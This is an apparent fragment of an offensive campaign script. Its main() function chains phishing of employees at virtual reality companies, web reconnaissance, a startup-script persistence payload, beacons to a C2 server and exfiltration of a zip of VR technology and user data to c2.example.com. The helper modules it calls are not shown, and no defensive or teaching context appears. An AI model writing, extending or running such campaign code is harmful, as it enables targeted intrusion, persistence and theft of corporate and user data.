...
def main():
    """
    Main function to run the virtual_reality_campaign campaign.
    """
    print(f"[*] Starting virtual_reality_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("virtual_reality_companies_employees.txt")
    run_tool("apt_web_recon.js", "--target virtual_reality_companies.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/VR_technology_and_user_data_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-VIRTUAL_REALITY_COMPANIES-01")
    ...
    exfiltration.exfiltrate_data("VR_technology_and_user_data/VR_technology_and_user_data.zip", "https://c2.example.com/upload")
    run_tool("payloads/VR_technology_and_user_data_exfiltrator.py")
